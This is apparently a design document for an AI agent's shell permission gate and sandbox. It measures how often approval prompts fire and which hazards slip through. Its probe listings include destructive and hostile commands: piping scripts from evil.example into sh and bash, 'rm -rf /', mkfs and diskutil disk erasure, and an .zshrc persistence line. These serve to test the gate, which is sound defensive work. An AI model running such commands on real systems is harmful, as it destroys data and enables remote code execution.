# Permissions: from per-command approval to capability grants

**Status:** the gate is rewritten and measured (steps 1-3); one consent store holds all
four consent kinds with three explicit lifetimes, and the shell gate reads and writes it
(step 4); a "yes" now remembers the **capability** the question proposed rather than the
command line (step 5) — measured, answering each of the corpus's questions once for the
project turns 7 prompts into 0, with no leak into another project; `/trust` shows and
revokes what was granted, including the config-level list that no card ever mentioned
(step 7); and every card names the grant it offers and why it is asking, while
`memory_clear` is answerable from a chat channel instead of impossible there (step 6).
What remains is the browser's fourth button and the sandbox half of the write boundary,
plus aliasing the old consent commands — itemised at the end of this document, with the one
item this host cannot verify called out.

Everything in "What I measured" was produced by a probe against the code in this repo
([`scripts/permission_prompt_probe.py`](../../../scripts/permission_prompt_probe.py)), not
estimated.

The complaint this answers: *the user is asked too often, and the design that asks is more
complicated than the thing it protects.*

## TL;DR

There are two permission mechanisms in this repo and they answer **the same question**, so
neither is decisive and the user pays for both:

* the **OS sandbox** (`agent/security/sandbox/`) decides what a shell child may touch;
* the **consent gate** (`agent/security/shell.py`) decides when to stop and ask.

Measured, at the default level **before the change**: the gate asked on **19% of ordinary
development commands** and the overwhelming majority of those asks were about *syntax*
(`|`, `>`, `&&`) — while `rm -rf /`, `sudo rm -rf /`, `git clean -fdx`,
`mkfs.ext4 /dev/sda1`, `chmod -R 777 /` and `diskutil eraseDisk` all **ran with no prompt at
all**.  The prompt stream and the risk were uncorrelated, because the gate classified the
*command name* while the risk lives in the *arguments*, and the sandbox permits nearly every
write.

The fix is not a better list.  It is to stop asking per command and start **granting
capabilities**:

> The sandbox is the boundary.  The human is asked only to *widen* it, or to authorise
> something that cannot be undone.  Every answer is remembered, at a lifetime the human
> chose, for the workspace they chose.

After the gate rewrite the default asks on **12%** (9% if the two genuinely destructive git
commands in the corpus are excluded) and **18 of 19 hazards ask**, with composition between
harmless commands free at every level.  The remaining simplification — one store, one card,
`/trust` — is what turns the answers that are still given into grants that are not asked
again.

## What I measured

**These are the numbers before the change**, and they are what the design was argued from.
The same probe now reports the after-state in [Measured after step 1](#measured-after-step-1).

Corpus: 58 commands an agent actually runs doing ordinary work (explore, read, test, build,
install, git, network, format, docker, misc).  Probe: `scripts/permission_prompt_probe.py`.

### 1. The gate fires on syntax, which is everywhere

| level | prompts | share | what still prompts |
|---|---|---|---|
| `ask` (default) | 11 / 58 | **19%** | operators ×7, inline interpreter ×2, env mutation ×2 |
| `medium` | 9 / 58 | 16% | operators ×7, env mutation ×2 |
| `high` | 2 / 58 | 3% | `pip install` ×2 |
| `full` | 2 / 58 | 3% | `pip install` ×2 |

**7 of the 11 prompts at the default level are shell operators** (as classified by the
checker's own reason string: `shell control operator` ×4, `shell redirection` ×3).  They are
the single largest source of interruption, and they are pure syntax:

```
pytest -q 2>&1 | tail -20     ->  shell control operator '|' requires confirmation
npm test > /tmp/out.txt       ->  shell redirection requires confirmation
cargo test --all 2>&1 | tee   ->  shell control operator '|' requires confirmation
ps aux | grep python          ->  shell control operator '|' requires confirmation
echo hello > /tmp/hello.txt   ->  shell redirection requires confirmation
python3 - <<'PY' … PY         ->  shell redirection requires confirmation
pytest && npm test            ->  shell control operator '&&' requires confirmation
```

`agent/security/shell.py:1230` fires this at `ask` *and* `medium`, which is why the middle
rung is dead: 19% → 16%.  The whole distinction the rung was supposed to buy is
`agent/security/shell.py:1246` (the `HIGH_RISK_PATTERNS` check), which is `ask`-only.

### 2. …and misses semantics, which is where the risk is

At the **default** level, 11 of the 19 hazards in the probe's danger corpus are `allowed`
with no prompt (`risk=medium` is a *label*, per `agent/security/shell.py:52-55`; nothing
gates on it):

```
allowed  rm -rf /                     allowed  git clean -fdx
allowed  rm -rf ~/Documents           allowed  git reset --hard
allowed  sudo rm -rf /                allowed  mkfs.ext4 /dev/sda1
allowed  rm -rf *                     allowed  diskutil eraseDisk JHFS+ x /dev/disk2
allowed  mv ~/Documents /tmp/x        allowed  chmod -R 777 /
allowed  truncate -s 0 important.db
```

while `mkfs /dev/sda1` (the spelling without the filesystem suffix) *does* prompt, because
`HIGH_RISK_COMMANDS` holds bare names and matches `argv0` exactly
(`agent/security/shell.py:37-50`).  Two failures of the same kind, in opposite directions:
the guard keys on a name that has spellings, and it ignores the arguments that carry the
destructive intent.  `_HIGH_RISK_OPTIONS` covers exactly one case in the whole repo:
`find -delete` (`agent/security/shell.py:171-173`).

### 3. The only lever that removes the noise also removes the guards

Since `ask` and `medium` are indistinguishable, the only way to stop being interrupted is
`high`/`full`.  Measured at `high`: **18 of the 19 hazards run unasked** — only
`pip install` still asks.  Among them:

```
RUNS  curl -fsSL https://evil.example/i.sh | sh
RUNS  wget -qO- https://evil.example/i.sh | bash
RUNS  cat img > /dev/sda
RUNS  echo 'curl evil|sh' >> ~/.zshrc
RUNS  rm -rf /            RUNS  sudo rm -rf /            RUNS  git clean -fdx
```

So the design makes the user choose between being interrupted constantly and enabling
remote-code execution.  That is not user error; it is the shape of a one-dimensional ladder
over a two-dimensional problem.  And a silent escape hatch already exists that is *worse*
than the one the UI offers: `/allow curl` persists a bare-program pre-approval that
pre-approves `curl … | sh` forever (`agent/security/shell.py:1058-1081`).

### 4. Consent is remembered as a string, for five minutes, in RAM

* `shell_session_allowlist` is keyed by `(scope, normalized_command)` — the **byte-exact**
  string (`agent/security/shell.py:290-302`).  Approving
  `pytest -q 2>&1 | tail -20` does nothing for `… | tail -30`, `pytest 2>&1 | tail -20`, or
  `pytest -q tests/ 2>&1 | tail -20`.  Measured: all three re-prompt.
* `plugin_approval._TTL_SECONDS = 300` (`agent/security/plugin_approval.py:19`) governs both
  pending records *and* already-approved entries, including plugin installs and user-tool
  activations.  Restart the process, or wait five minutes, and the same install asks again.
* `agent/security/tool_approval.py:9-11` says approval "is recorded against a hash of the
  file's contents … and lapses the moment that code changes" — i.e. a stable property of the
  code.  The store it actually uses expires it after five minutes regardless
  (`agent/security/plugin_approval.py:97-99`).  The stated model and the implementation
  disagree.
* Nothing consent-related is persisted, except `user_tools`' per-digest
  `.approved.json` (`agent/tools/user_tools.py:38,423-443`) and the config-level
  `shell_allowed_commands` behind `/allow`.  Two persistent mechanisms exist, and neither is
  the one the consent card offers.

### 5. Three stores, five commands, three surfaces that disagree

Three records of "the human said yes" (`shell._session_allowlist`,
`plugin_approval._PENDING`/`_APPROVED`, `user_tools`' digest file), three scope-key
computations (two of them duplicating `_scope_key`, `agent/security/plugin_approval.py:24-28`),
and five slash commands to manage them: `/permissions`, `/auto-approve`, `/allow`, `/deny`,
`/confirm`.

The card differs by surface:

| surface | answers offered | "always" reachable |
|---|---|---|
| terminal (`agent/core/output.py:38-39,915-917`) | 2 — approve / deny | **no** |
| browser (`frontend/src/components/ApprovalBar.tsx:104-121`) | 3 — once / session / deny | yes |
| Feishu/chat (`agent/commands/coordinator.py:783-889`) | type one of 14 phrases | via `allow_session` only if the web/CLI answer set it |

So `shell_session_allowlist_add_persistent` (`agent/security/shell.py:305`) — the function
that implements "stop asking me about this" — **is unreachable from the terminal**, the
surface most users are on.  Nothing on any card mentions `/allow`, which is the one thing
that would actually end the interruptions.

### 6. The ambiguity cliff, at exactly the wrong moment

When more than one record is pending, chat approval refuses and tells the user to copy a
token: "当前有 N 条命令待确认，无法用"批准"批量放行；请使用 /confirm <token> 逐条批准"
(`agent/commands/coordinator.py:879-886`).  Several pendings is what happens when the agent
is working hard — the moment the user least wants to transcribe opaque strings.  Tokens are
also the only path that survives a disconnected browser
(`agent/channels/web_sink.py:690-701`), so the fallback is load-bearing.

Separately, the phrase set that redeems a **high-risk** action includes `ok`, `okay`, `y`,
`yes` (`agent/commands/coordinator.py:27-44`).  A bare "ok" sent to acknowledge something
else redeems a pending destructive command, and the message is consumed rather than reaching
the model.

### 7. The sandbox is not the backstop it is documented to be

`agent/security/sandbox/policy.py` says the write policy is deliberately inverted — writes
open, three asset classes carved out.  Resolved, that means:

```
read=True  write=True   /etc/hosts          read=True  write=False  ~/Documents/x
read=True  write=True   /usr/bin/python3    read=True  write=False  ~/.zshrc
read=True  write=True   /System/Library/x   read=False write=False  ~/Library/Keychains/x
read=True  write=True   /tmp/anything       read=True  write=True   /
```

Three consequences for the consent question:

1. **Writes are unbounded by default.**  The sandbox cannot serve as the reason not to ask
   about `rm -rf ~/code`, because it permits it.
2. **`~/.ssh` is readable.**  `.ssh` is excluded from `_SECRET_HOME_SUBDIRS` on purpose
   (`policy.py:75-82`) so `git push` keeps working — but the *read* deny is the one that
   matters for a credential, and network egress is open (`policy.py:417`).  Reading the
   private key and posting it out is available.
3. `/etc`, `/usr`, `/System` are writable in the policy.  Only the OS's own permissions stop
   that today, which means the sandbox is not the thing holding the line there either.

## The whole consent surface, counted

So that "simpler" is a number and not an adjective, here is the entire human-consent
surface as it stands.  There are exactly **four kinds** of consent in the tree, at exactly
**four call sites** — everything else is machinery around them.

| kind | gates | asks when | ask site |
|---|---|---|---|
| `shell` | one shell command | one of six classifier branches (`shell.py:1213-1306`) | `agent/tools/builtin_tools.py:2020` |
| `memory_clear` | wipe all durable memory | always — and **only reachable where a sink can prompt** | `agent/tools/memory_tools.py:115` |
| `install_plugin` | install a plugin with executable content | plugin ships Python/MCP/hooks | `agent/tools/plugin_tools.py:556` |
| `create_tool` | run generated Python in-process | digest not already in the ledger | `agent/security/tool_approval.py:79` |

Around those four:

* **six** in-memory stores of "the human said yes", plus **three** on disk
  (`_session_allowlist`, `_pending_tokens`, `_pending_session_scope`,
  `_session_permission_levels`, `_session_sandbox_modes`, `plugin_approval._PENDING` /
  `_APPROVED`, `user_tools`' `.approved.json`, config `shell_allowed_commands`, config
  `permissions.*` defaults);
* **four** permission levels, of which two are distinguishable in practice
  (19% → 16%);
* **three** sandbox modes bound to the level by a special case
  (`effective_sandbox_mode`, `policy.py:432-445`);
* **five** slash commands (`/permissions`, `/auto-approve`, `/allow`, `/deny`, `/confirm`);
* **three** surfaces whose answer sets differ, and "always" implemented on **one** of them;
* **fourteen** chat phrases that redeem a high-risk action, including `ok` and `y`;
* **one vestigial store**: `_session_auto_approve` (`shell.py:243`) is declared, cleared,
  and never written — auto-approve is really `_session_permission_levels`.

Three asymmetries fall out of the inventory and are worth naming, because each one is a
question the user has to answer again for no reason:

* `memory_clear` mints no pending record, so it is **impossible** on a chat channel
  (`memory_tools.py:108-113` refuses without an interactive sink) while every other kind
  is answerable by reply.
* "Always allow" requires `name == "shell"` plus a real token plus a
  `ShellAuthorizationScope` (`agent/channels/web_sink.py:771-786`), so a plugin install or a
  tool activation can **never** be answered "always" — and is asked again after the 300 s
  TTL lapses.
* `create_tool` asks on every create/update unless the content digest is already in the
  ledger, while `user_tools.enabled = true` (`agent/bootstrap.py:606-612`) loads every file
  in `~/.agent/tools/` at startup with **no** digest check at all — the ledger is enforced
  on the write path and skipped on the load path.
* Destruction is not what is gated, on this side either.  `delete_tool`
  (`agent/tools/user_tools.py:763-786`) and `uninstall_plugin`
  (`agent/tools/plugin_tools.py:569-593`) never ask, while *creating* the same tool does.
  "Once granted, a plain `once` approval also leaves a five-minute allowlist entry"
  (`shell_command_confirm` writes it with the pending token's own expiry,
  `agent/security/shell.py:545-550`), so "仅此一次" is not once.

## First principles

A permission system answers two different questions, and conflating them is what produced
the design above.

**Q1 — what may this process touch?**  A *boundary* question.  The answer should be
spelling-independent, enforced without a human, and cheap to evaluate.  This is what a
sandbox is for, and `agent/security/sandbox/` already has the right shape (a policy that
answers `effective_rights(path)`, with enforcement pushed to a backend).

**Q2 — what may be done that the boundary does not settle?**  An *authority* question.  It
has exactly three answers, and they are the only three a human ever needs:

* widen the boundary (write outside the workspace, relax a secret path, unsandbox);
* do something irreversible (destroy state, run code in-process, forget memory);
* neither — in which case nobody should be asked.

The current design has no representation of Q1 in the consent path, so it asks Q2-shaped
questions using Q1-shaped evidence: it inspects the command string and asks when the string
*looks* unusable, which is a statement about syntax, not about authority.

The reframing that follows:

> **Stop approving commands.  Grant capabilities.**
> A command approval is unbounded, unmemorable work with poor precision.  A capability grant
> is rare, meaningful, and remembered.

## The design

### One boundary, one gate

* **Boundary** — the sandbox, three modes as today (`restricted` / `read_all` / `none`), but
  as an **independent axis**.  The rule "`none` requires `full`" goes away; turning the
  sandbox off is now an explicit act of the human (`/permissions sandbox none`, confirmed
  once, remembered) instead of a side effect of picking a noise level.
* **Gate** — one sentence, evaluated in one place:

  > **Ask when the command can reach outside the workspace the user gave me, or when its
  > effect cannot be undone inside it.**

Everything else runs.  Concretely, replacing the five confirm sites in
`agent/security/shell.py:1213-1306`:

| construct | today | proposed |
|---|---|---|
| `\|`, `&&`, `;`, `&`, newline | asks as a blob | **split into segments**, classify each; the operator itself is not a risk |
| `>`, `>>`, `<`, `<<` | asks | classify the **redirect target** as a write target; ask only if it is outside the workspace |
| `$(…)`, backticks | blocked | blocked (unchanged — the target set cannot be determined, so fail closed) |
| inline `-c` / `-e` body | asks | scan the body against the same rules; **block** unreadable bodies (`exec(base64…)`), run readable ones, ask when it contains an out-of-boundary path |
| `rm -rf /`, `sudo rm -rf /` | **allowed** | out-of-boundary write target → **ask** |
| `rm -rf ./build` | allowed | no ask (inside the workspace, and undoable) |
| `git clean -fdx`, `git reset --hard` | allowed | no ask (inside the workspace) — *see the open question below* |
| `mkfs.ext4 /dev/sda1`, `diskutil eraseDisk`, `dd of=/dev/…` | **allowed** | block device → ask |
| `chmod -R 777 /` | **allowed** | out-of-boundary → ask |
| `pip install -r requirements.txt` | asks at **every** level | ask, but rememberable (below); today's "every level, forever" is the one thing a level cannot express |
| write to `~/code/other-project` | silently allowed by the sandbox | ask **once**, then it is a grant |

The target extraction is the piece that needs care, and the code already has the machinery:
`_has_absolute_path_token` (`shell.py:988`) resolves path-like tokens against `allowed_roots`,
and the redirect/`of=`/`-o`/`--output` forms are a bounded set.  The safety property that
makes a heuristic acceptable: **anything whose target set cannot be determined is opaque, and
opaque fails closed** — variables, substitutions, interpreter bodies that do not parse into
the rule language.  That is the same reason `$(…)` is blocked today, applied consistently.

### One memory, three lifetimes

**Implemented** (`agent/security/consent.py`).  One store, keyed by `(scope, rule)` for the
two expiring lifetimes and by `(workspace, rule)` for the third, where a rule is a
*capability* rather than a string:

| lifetime | meaning | storage |
|---|---|---|
| `once` | this request, bounded by the question's own five-minute window | RAM |
| `session` | every matching request in this scope, until the process exits | RAM |
| `always` | every matching request in this **workspace**, across restarts and sessions | disk |

All four consent kinds write it: shell commands, plugin installs, user-tool activation and —
once it is given a pending record — memory clear.  What made the port possible without
moving behaviour was giving the store the seams the gate's own tests already drove: an
`at=` clock per call, an `expires_at=` override for `once` (so an approval answers *the
question's* window rather than the moment of the answer), and a `kind` on every record (so
two questions from different kinds in one store do not get counted as each other's
ambiguity).  The store's own state is instance state — five containers on one object rather
than five module names — which is recorded in `agent/runtime/state_ledger.py` as a decision.

`always` is the part that removes the long tail, and it is now reachable *and general*: an
`always` answer remembers the rule the gate proposed when it asked, which is the narrowest
rule that would have prevented the question.  The rule differs by reason, because the reason
is what makes one rule right and another too broad:

| why it asked | what "always, for this project" remembers |
|---|---|
| a write outside the workspace | `path:<the resolved target>` — the question was *this place* |
| an environment mutation (`pip install …`) | `program:<argv0>` — the next install is a different line of the same intent |
| anything else (unreadable code, an irreversible git command, a pipe into an interpreter, a named destructive command) | `command:<the exact line>` — broader would grant code that was never read |

The gate decides this (`ShellCheckResult.approval_rule`) because it is the only place that
knows *why*; the pending record carries the rule and the workspace, so no surface has to know
either in order to offer the answer; and a prompt asked without a workspace cannot offer it at
all, because "this project" with no project would be a grant in the global bucket — a
different and much wider promise.

Measured: the 58-command corpus raises 7 questions at the default level, those answers need
**6 distinct rules**, and re-running the corpus afterwards asks **0** times — while another
project still asks the same 7 (`scripts/permission_prompt_probe.py`).

Revocation is one command — `/trust` lists rules and revokes one — which is what
"consent that can be granted but never taken back is not consent" demands, and what today
requires knowing that `/deny <program>` removes an entry from a *different* list than the
one the card wrote.  Not built yet; `revoke_scope` (the web session-revoke path) and the
store's `revoke` already give it everything it needs.

### One card, every surface

The same record, rendered three ways.  The card answers four questions, and the second one
is the one no surface answers today:

```
需要你的批准                                    [不可逆]
  npm test                                     (this workspace)
  为什么问：这个程序要写 ~/code/other-project，在工作区之外
  [ 仅此一次 ]  [ 总是允许 npm（本项目） ]  [ 拒绝 ]  [ 永不允许 ]
```

* **why it is being asked**, in one sentence naming the rule that fired.  Today the card
  shows a risk level and a bare reason string; there is a `narrow_alternatives_hint`
  (`policy.py:477`) that does exactly this for sandbox denials, and the same idea belongs on
  every card.
* **three answers everywhere**: `once` / `always` (stating the scope it will cover) / `deny`,
  plus `never` as the inverse of `always`.  The terminal gains the two it lacks
  (`agent/core/output.py:915-917`); the browser keeps its bar; chat gains a **numbered list**
  so that N pendings are answered "1 3" instead of by transcribing tokens
  (`coordinator.py:879-886`).  Tokens stay as the reconnect/out-of-band path
  (`web_sink.py:690-701`), not the default.
* Approval phrases in chat shrink to the unambiguous set.  `ok`/`okay`/`y` stop redeeming a
  high-risk action; a bare `同意`/`批准`/`approve` still does, because it cannot plausibly
  mean anything else.

### Levels: the middle rung, not fewer rungs

**Superseded, and the reason is worth keeping.**  This section originally proposed
collapsing four levels into two, on the measured grounds that `medium` differed from `ask`
by almost nothing (19% → 16%): the operator guard asked at *both*, so the middle rung was
dead and the only way to stop being interrupted was `high` — which also stops asking about
remote-code execution.  That was a statement about the *guard*, not about the ladder.

Once composition stopped being a rung, implementing the gate revealed the opposite
problem: every new authority check was `ask`-only, so `medium` silently became equal to
`high` — a level that turns off the workspace boundary and hidden-program checks without
saying so.  Gating the *reason* rather than the *syntax* fixes both at once, and the ladder
becomes three rungs that each mean something:

| level | asks about | the rung buys |
|---|---|---|
| `ask` (default) | named destruction, code it cannot read, out-of-boundary writes, in-workspace irreversibility, hidden programs, env mutation | — |
| `medium` | out-of-boundary writes, in-workspace irreversibility, hidden programs, env mutation | inline `-c`/`-e` stops asking |
| `high` / `full` | env mutation only | the whole gate stops; `full` additionally permits an unsandboxed shell |

So the collapse is **not needed**, and doing it would have removed a rung that is now load
bearing.  What the design still wants is the sandbox as an independent axis (today
`sandbox none` requires level `full`), which is a smaller change with the same point:
turning the sandbox off should be the human's explicit act, not a side effect of choosing a
noise level.  Pinned by `tests/test_shell_security.py::test_medium_is_a_real_rung_and_not_a_second_high`.

The gain the collapse was meant to buy is already here: **the user can be asked almost never
without switching off the destructive guard.**  Before, those were the same switch.

## Measured after step 1

Same probe, same corpora, run against the segmented gate.  The first two rows are the whole
point of the change: they move in opposite directions, which is what "calibrated" means.

| | before | after |
|---|---|---|
| prompts on the 58-command corpus at the default (`ask`) | 11 (19%) | **7 (12%)** |
| …of which are shell syntax rather than authority | 7 | **0** |
| destructive probes that run unasked at the default | **11 of 19** | **1 of 19** |
| destructive probes that run at `high` | 18 of 19 | 18 of 19 |
| `curl … \| sh` at the default | asks | **asks** (now because the right side is a shell, not because a pipe is present) |
| `curl … \| sh` at `medium` | asks | **asks** (the authority rung is not skipped) |
| `echo hi \| sh` end-to-end | asks | **asks** (`tests/test_functional_turns.py`) |

The prompt ladder after the change: **ask 7 (12%) → medium 5 (9%) → high 2 (3%)** — three
distinct rungs, where before `medium` was within two prompts of `ask` and `high` was the
only escape.

The 7 prompts at the default are: inline interpreter code ×3, environment mutation ×2, and
`git reset --hard` / `git clean -fd` ×2 — the last two being *genuinely destructive commands
that happened to be sitting in the "ordinary work" corpus*.  Excluding them, the noise rate
on ordinary development commands is **5 of 58 (9%)**, and every one of those is a real
authority question rather than a spelling of one.

The 1 hazard left unasked is `truncate -s 0 important.db`: a single named file inside the
workspace.  It is the deliberate edge of the in-workspace rule — a target the human already
granted by pointing the agent at the directory — and it is listed in the open questions
rather than papered over.

Fifteen of the nineteen hazards now ask at the default level.  The four that did not ask for
the wrong reason before now ask for the right one: `rm -rf ~/Documents` and `chmod -R 777 /`
and `mv ~/Documents /tmp/x` because their **target** is outside the workspace,
`mkfs.ext4 /dev/sda1` and `diskutil eraseDisk` because the **spelling** no longer escapes a
name-keyed list, and `cat img > /dev/sda` / `echo x >> ~/.zshrc` by where the **redirect**
writes.

## What the remaining steps should do to the numbers

Measured where the work is done; predicted where it is not.

| | before | now | remaining work |
|---|---|---|---|
| prompts on the corpus at the default | 11 (19%) | **7 (12%)** | — |
| hazards unasked at the default | 11 of 19 | **1 of 19** | — |
| prompts after answering each once for the project | 11 | **0** (6 rules) | — |
| levels a user must understand | 4 (1 real) | **4 (3 real)** | — (collapse withdrawn) |
| slash commands for consent | 5 | **6** (`/trust` added; the 4 old ones still work) | aliasing the old four onto the store |
| consent stores (in-memory + on disk) | 6 + 3 | **1 + 1** (the store, plus `user_tools`' digest ledger and the config allowlist, both documented) | — |
| surfaces where "always" exists | 1 of 3 | **2 of 3** (terminal, browser backend) | the browser's fourth button; chat has numbered replies but no "always" |
| consent kinds answerable off-terminal | 3 of 4 | **4 of 4** (`memory_clear` gained a pending record) | — |
| cards that say *why* they are asking | 2 of 3 | **3 of 3** (the reason travels on the record) | — |
| places a standing permission could hide | 4 | **1** (`/trust`, which lists the config allowlist too) | — |
| consent lifetime | 5 min, RAM | **once / session / always** | — |

## Decisions taken

1. **Write boundary — decided: collapse it to the workspace.**  The sandbox becomes the
   boundary it is documented to be (workspace + the enumerated tool-state dirs + temp),
   and every exception is a remembered grant.  Not yet implemented (step 5): the gate
   already *asks* about out-of-boundary writes, so the behaviour is right, but the sandbox
   still permits them, which means the enforcement is the prompt rather than a rule.
2. **`git clean -fdx` / `git reset --hard` — decided: they ask, and now they do.**
   Implemented as `_workspace_irreversible_reason`: `git clean` with any of `f`/`x`/`d`/`X`,
   `git reset --hard`, `git restore`/`git checkout` on the whole tree, and `rm` through a
   wildcard or at `.`.  Named targets stay free (`rm -rf node_modules`, `git clean -n`,
   `git checkout -b`), because a target inside the workspace is inside the blast radius the
   human granted by pointing the agent at the directory.
3. **Inline interpreter bodies.**  Still open.  Today every `-c`/`-e`/`-` asks (3 of the 7
   remaining prompts); the alternative is to parse the body against the rule language and
   fail closed on the unreadable ones — near-zero noise, but it is the largest new piece of
   machinery in this design.
4. **Command surface.**  Still open.  Collapse `/allow`, `/deny`, `/auto-approve`, `/confirm`
   into `/trust` + the card, or keep them as documented aliases.
5. **`~/.ssh`.**  Still open.  Readable today for `git push`; making it read-denied by
   default trades a common workflow for the largest credential exposure in the resolved
   policy.

## Implementation order

1. ✅ **Segment the operator guard.**  `_structural_guard` no longer returns `confirm` for
   any operator; `shell_command_check` splits the string on `|`/`|&`/`&&`/`||`/`;`/`&`/newline
   and classifies each segment on its own merits.  Landed, with the operator-era tests
   rewritten to pin the new intent rather than deleted.
2. ✅ **Route redirects through the target check.**  `>`/`>>` are judged by where they write
   (`_redirect_target_reason`); `<`/`<<`/`<<<`/`>&` are descriptor operations and ask nothing.
3. ✅ **The target extractor and the out-of-boundary → ask rule.**  `_target_outside_roots`
   (granted roots + temp, relative = inside, unresolvable = fail closed),
   `_argument_write_reason` for the mutating commands, and `_workspace_irreversible_reason`
   for the in-workspace unbounded cases.  The pipe-into-an-interpreter rule
   (`_reads_program_from_stdin`) replaced the operator blanket, and the measured
   name-keyed misses were closed with `_high_risk_command_reason` (`mkfs.*`, `diskutil
   erase*`).
4. ✅ **One `ConsentStore`, three lifetimes** (`agent/security/consent.py`).  All four
   consent kinds write it: `plugin_approval.py` is a thin adapter, the shell gate's
   allowlist and pending tokens are the shell-facing view of its records, the ledger is
   configured once in the composition root, and `always` is reachable for the first time
   (installs and activations previously could not answer it at all).  30 tests in
   `tests/test_consent_store.py` pin the lifetimes, the persistence, the ambiguity policy,
   the kind isolation and the two resets that must *not* touch a workspace's grants.
5. ✅ **Make a shell answer generalise** (`ShellCheckResult.approval_rule`, `_project_grant`,
   the `workspace` parameter, the store's `always_rule`/`workspace` on a pending record).
   Answering once for the project now covers the next spelling, the next install of the same
   program and the next file under a granted place, and it stays inside that project.
   ⏳ Remaining beside it: **collapse the sandbox's write boundary to the workspace** and feed
   remembered `path:` grants into `write_scope`.  The gate already asks about out-of-boundary
   writes, so the behaviour is right; what is missing is that the sandbox still permits them,
   which leaves the prompt as the enforcement rather than a rule behind it.
6. ⏳ **One card.**  The terminal has four answers and prints the rule each wider answer
   would remember ("本项目总是允许（记住：这个程序的所有调用：pip）"); the browser backend
   advertises and honours `allow_project`, carrying `project_rule` and its rendered label;
   chat gained a numbered reply, a refusal, and memory clears; and every question now
   carries its **reason** on the record, so the chat list — the only card a chat user ever
   sees — says why each one is being asked rather than just what would run.  Still missing:
   the browser's fourth *button* (a frontend change plus a rebuild; the backend needs
   nothing more).
7. ✅ **`/trust`**, and the old commands as aliases.  `/trust` lists both lifetimes, names
   the *kind* of each grant, revokes by number or wholesale, honours both scope and
   workspace so revoking "pip here" cannot drop it for another project or user, and also
   lists the **config-level** `shell_allowed_commands` as a separate, unnumbered section —
   that list pre-approves commands outside any consent record and nothing in the UI used to
   mention it.  The old commands still work and are now the legacy spelling of the same
   intent; aliasing them onto the store is the small remaining cleanup, not a capability
   gap.

Steps 1-5 and 7 are done, and 6 is done on every surface whose change is backend-only.  The
next item is the sandbox half of the write boundary — with one honest caveat, recorded here
so the decision is visible rather than implied: **it cannot be verified on this host.**
`sandbox-exec` is unavailable, so all thirteen `tests/test_sandbox_conformance.py` cases
(and `test_shell_allows_output_dir_writes`) are pre-existing failures on this machine —
which means a change to the boundary would land with its enforcement untested.  It should be
done on a host that can run the sandbox, and the tool-state list audited first, so that
"writes are confined to the workspace" does not break a tool whose cache lives elsewhere.
